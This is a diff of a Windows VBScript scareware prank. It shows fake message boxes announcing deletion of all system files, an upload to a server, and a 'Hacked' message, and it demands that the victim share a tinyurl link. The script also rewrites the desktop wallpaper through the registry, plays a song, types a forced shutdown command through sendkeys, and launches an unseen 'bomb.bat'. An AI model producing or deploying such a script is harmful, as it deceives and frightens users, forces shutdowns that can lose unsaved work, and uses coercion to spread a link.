@@ -16,8 +16,7 @@ X=MsgBox("Deleting All System Files..",2+16,"File Deletion")
 X=MsgBox("Virus will delete system. You can avoid it by sharing this post: https://tinyurl.com/anonymus-hack-post. Click okay, when you done.",1+48,"Critical Virus Alert") 
 X=MsgBox("Please Wait. Uploading files to server. Do you wish to cancel operation?",4+64,"File Transfer") 
 X=MsgBox("Error while stopping operation. File Transfer completed.",1+16,"Completed") 
-X=MsgBox("You did not share post.",0+48,"Possible Threat Detected") 
-X=MsgBox("Your computer is under control now.",1+64,"Hacked") 
+X=MsgBox("You did not share post.",0+48,"Possible Threat Detected")
 dim wshShell 
 dim sUserName
 
@@ -34,7 +33,9 @@ sWallPaper = "E:\wallpaper.jpg"
 oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper
 
 ' let the system know about the change 
-oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True 
+X=MsgBox("Your computer is under control now.",1+64,"Hacked")
+
 Dim oPlayer
 Set oPlayer = CreateObject("WMPlayer.OCX")
 oPlayer.URL = "E:\song.mp3"
@@ -58,7 +59,7 @@ shellobj.sendkeys "CONTROL "
 wscript.sleep 500
 shellobj.sendkeys "{ESC}"
 wscript.sleep 50
-shellobj.sendkeys "shutdown -s -f -t 30 -c DESTROYING DATA"
+shellobj.sendkeys "shutdown -s -f -t 3600"
 wscript.sleep 50 
 shellobj.sendkeys "{ENTER}"
 shellobj.run "bomb.bat"
